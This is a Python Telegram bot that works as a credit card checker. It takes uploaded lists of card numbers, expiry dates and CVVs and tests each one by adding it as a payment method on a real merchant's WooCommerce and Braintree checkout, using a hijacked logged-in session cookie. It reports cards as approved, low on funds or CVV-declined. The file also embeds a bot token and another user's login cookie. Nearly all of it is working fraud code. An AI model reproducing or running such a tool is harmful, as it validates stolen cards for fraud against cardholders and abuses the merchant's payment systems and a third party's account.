import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
def  binn(bin,c,re):
	return f"""Card : <code>{c}</code>
Status : <strong>Approved</strong> ✅
Response : {re}
Gateway : Braintree Auth

by : @naro9090"""

onwer = 1133597877
token = "7001053070:AAFEOwXhiScTVoiKe8bJWCt79Io85SV2zVQ"


bot = telebot.TeleBot(token)



@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == onwer:
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,f"مرحبا صديقي في البوت ارسل الكومبو ليتم فحصه ",parse_mode="markdown")




@bot.message_handler(content_types=['document'])
def send_file(message):
	session = requests.Session()
	bad=0
	ccn=0
	cvv=0
	app=0
	nc=0
	try:
		file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open(f"{message.document.file_name}", 'wb') as f:
			f.write(file_input)
	except:
		bot.reply_to(message, text='خطأ في الكومبو')
	key = types.InlineKeyboardMarkup(row_width=1)
	af = types.InlineKeyboardButton('المالك', url='https://t.me/naro9090')
	key.add(af)
	cou = len(open(f"{message.document.file_name}","r").read().splitlines())
	idmss=bot.reply_to(message, text=f'Done Read Files Count: {cou}',reply_markup=key)
	cookies = {
    'sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1': '1',
    '_ym_uid': '1716632590146921557',
    '_ym_d': '1716632590',
    '_gcl_au': '1.1.575605.1716632590',
    '_ga': 'GA1.1.1148252323.1716632590',
    '_fbp': 'fb.1.1716632590702.1903824459',
    'tracker_device': 'd04280df-e1b8-4bea-9de9-bf4e4ef26340',
    '_ym_isad': '2',
    'addshoppers.com': '2%7C1%3A0%7C10%3A1716632593%7C15%3Aaddshoppers.com%7C44%3AMTZlZWFiNzA5ZGRkNGYwZGFkMWQwNWIxY2E1Mjc4NDQ%3D%7C166c8dcd9b456f39cbc698f276a5ed3ae9b23bb4639e45bd002d8858d36d7e54',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580': 'hussain.alfuraiji-7829%7C1717877237%7CTfQKSIcEo17Nc7HGIPEjtzcjrdYkjygjj2l8hp3TI99%7C392134e32e20ba4f2b125382f19c7d8fe4c1a758589b32fa042dd7e704829e35',
    '_uetsid': 'c96151b01a8011efaf372139f80f90fa',
    '_uetvid': 'c961b0801a8011ef82ddd34b4e6381b8',
    '_ga_2KRDKZ6RTB': 'GS1.1.1716667396.3.1.1716667657.53.0.1230894126',
    '__kla_id': 'eyJjaWQiOiJNRGcwTXpGbFpqTXRZek5pTUMwME16VTRMVGt3TmprdFlUWmxZakJqTURSbE1ETmwiLCIkZXhjaGFuZ2VfaWQiOiJ6X2NnOEdNdnhyNEZPZjJfRHhPdE5zNmw4cFdQOGVuWVJhN3ZHdUFUMnNnLlRLWFNOSyJ9',
}

	headers = {
		    'authority': 'bigbattery.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'referer': 'https://bigbattery.com/my-account/payment-methods/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		}
		
	r= session.get('https://bigbattery.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',r.text)[0]
	aut=r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	for g in open(f"{message.document.file_name}","r").read().splitlines():
		nc+=1
		c = g.strip().split('\n')[0]
		cc = c.split('|')[0]
		exp=c.split('|')[1]
		ex=c.split('|')[2]
		try:
			exy=ex[2]+ex[3]
			if '2' in ex[3] or '1' in ex[3]:
				exy=ex[2]+'7'
			else:pass
		except:
			exy=ex[0]+ex[1]
			if '2' in ex[1] or '1' in ex[1]:
				exy=ex[0]+'7'
			else:pass
		cvc=c.split('|')[3]
		url = "https://payments.braintree-api.com/graphql"
	
		payload = json.dumps({
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'e4972f5c-8a01-4f9d-9cf6-ee31034cd6ff',
		  },
		  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
		  "variables": {
		    "input": {
		      "creditCard": {
		        "number": cc,
		        "expirationMonth": exp,
		        "expirationYear": "20"+exy,
		        "cvv": cvc,
		        "billingAddress": {
		          "postalCode": "10080",
		          "streetAddress": ""
		        }
		      },
		      "options": {
		        "validate": False
		      }
		    }
		  },
		  "operationName": "TokenizeCreditCard"
		})
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'sec-ch-ua-mobile': "?0",
		  'authorization': "Bearer "+auth,
		  'braintree-version': "2018-05-10",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'origin': "https://assets.braintreegateway.com",
		  'sec-fetch-site': "cross-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://assets.braintreegateway.com/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
		}
		
		response = session.post(url, data=payload, headers=headers)
		
		tokencc=(response.json()['data']['tokenizeCreditCard']['token'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': f'Bearer {auth}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://bigbattery.com',
		    'referer': 'https://bigbattery.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		}
		
		json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'e4972f5c-8a01-4f9d-9cf6-ee31034cd6ff',
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
		}
		
		response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
		googleauth=(response.text.split('environment":"PRODUCTION","googleAuthorization":')[1].split('"')[1])
		braintreeClientId=(response.text.split('"braintreeClientId":')[1].split('"')[1])
		clientId=(response.text.split('"clientId":')[1].split('"')[1])
		merchants=(response.text.split('"merchantIdentifier":')[1].split('"')[1])
		
		
		url = "https://bigbattery.com/my-account/add-payment-method/"
		
		payload = 'payment_method=braintree_cc&braintree_cc_nonce_key='+tokencc+'&braintree_cc_device_data={"device_session_id":"82f43ccb91913d6b3f01ca8d97315149","fraud_merchant_id":null,"correlation_id":"da7966ac68dbdb0c429a353a7bd7d12e"}&braintree_cc_3ds_nonce_key=&braintree_cc_config_data={"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/'+merchants+'/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/'+merchants+'"},"merchantId":"'+merchants+'","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":'+merchants+'","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American+Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"BIGBATTERY,+INC.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"'+googleauth+'","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"BIGBATTERY,+INC.","clientId":"'+clientId+'","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"'+braintreeClientId+'","billingAgreementsEnabled":true,"merchantAccountId":"bigbatteryinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}&woocommerce-add-payment-method-nonce='+nonce+'&_wp_http_referer=/my-account/add-payment-method/&woocommerce_add_payment_method=1'
		
		headers = {
    'authority': 'bigbattery.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; _ym_uid=1716632590146921557; _ym_d=1716632590; _gcl_au=1.1.575605.1716632590; _ga=GA1.1.1148252323.1716632590; _fbp=fb.1.1716632590702.1903824459; tracker_device=d04280df-e1b8-4bea-9de9-bf4e4ef26340; _ym_isad=2; addshoppers.com=2%7C1%3A0%7C10%3A1716632593%7C15%3Aaddshoppers.com%7C44%3AMTZlZWFiNzA5ZGRkNGYwZGFkMWQwNWIxY2E1Mjc4NDQ%3D%7C166c8dcd9b456f39cbc698f276a5ed3ae9b23bb4639e45bd002d8858d36d7e54; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580=hussain.alfuraiji-7829%7C1717877237%7CTfQKSIcEo17Nc7HGIPEjtzcjrdYkjygjj2l8hp3TI99%7C392134e32e20ba4f2b125382f19c7d8fe4c1a758589b32fa042dd7e704829e35; _ga_2KRDKZ6RTB=GS1.1.1716667396.3.1.1716667674.36.0.1230894126; __kla_id=eyJjaWQiOiJNRGcwTXpGbFpqTXRZek5pTUMwME16VTRMVGt3TmprdFlUWmxZakJqTURSbE1ETmwiLCIkZXhjaGFuZ2VfaWQiOiJ6X2NnOEdNdnhyNEZPZjJfRHhPdE5zNmw4cFdQOGVuWVJhN3ZHdUFUMnNnLlRLWFNOSyIsIiRyZWZlcnJlciI6eyJ0cyI6MTcxNjY2NzY3NywidmFsdWUiOiJodHRwczovL2JpZ2JhdHRlcnkuY29tL215LWFjY291bnQvcGF5bWVudC1tZXRob2RzLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2JpZ2JhdHRlcnkuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxNjY2NzY3NywidmFsdWUiOiJodHRwczovL2JpZ2JhdHRlcnkuY29tL215LWFjY291bnQvcGF5bWVudC1tZXRob2RzLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2JpZ2JhdHRlcnkuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9fQ==; _uetsid=c96151b01a8011efaf372139f80f90fa; _uetvid=c961b0801a8011ef82ddd34b4e6381b8',
    'origin': 'https://bigbattery.com',
    'referer': 'https://bigbattery.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		
		response = session.post(url, data=payload, headers=headers)
		soup = BeautifulSoup(response.text, 'html.parser')
		try:
			try:
				msg = soup.find('ul', class_='woocommerce-error').text.strip().split(":")[1]
				bad+=1
				color="\033[1;31m"
			except:
				msg = soup.find('ul', class_='woocommerce-error').text.strip()
		except:
			msg = response.text
			color="\033[1;31m"
		if 'Card Issuer Declined CVV' in msg:
			re="Declined CVV ❎"
			msg="Declined CVV ❎"
			color='\033[1;32m'
			ccn+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Insufficient Funds' in msg:
			re="Insufficient Funds. ✅"
			msg="Insufficient Funds. ✅"
			color='\033[1;32m'
			cvv+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg or "woocommerce-message" in msg:
			app+=1
			msg="Approved ✅"
			re="Approved. ✅"
			color='\033[1;32m'
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		
		
		key = types.InlineKeyboardMarkup(row_width=1)
		ccli = types.InlineKeyboardButton(f" {g} ☢", callback_data="cclist")
		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❎", callback_data="cvv")
		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❎", callback_data="cvv")
		ap = types.InlineKeyboardButton(f" approved : {app} ✅", callback_data="aproved")
		badd = types.InlineKeyboardButton(f" stauts : {msg} ❕", callback_data="baad")
		nch = types.InlineKeyboardButton(f" num chk : {nc} 💱", callback_data="chk")
		own = types.InlineKeyboardButton(f"المالك", url="https://t.me/naro9090")
		key.add(ccli,badd,nch,ap,ccnn, cvvv,own )
		bot.edit_message_text(chat_id=message.chat.id, message_id=idmss.message_id,text="Checker Run ✔", reply_markup=key)
		time.sleep(30)
		
bot.polling()


# account 9079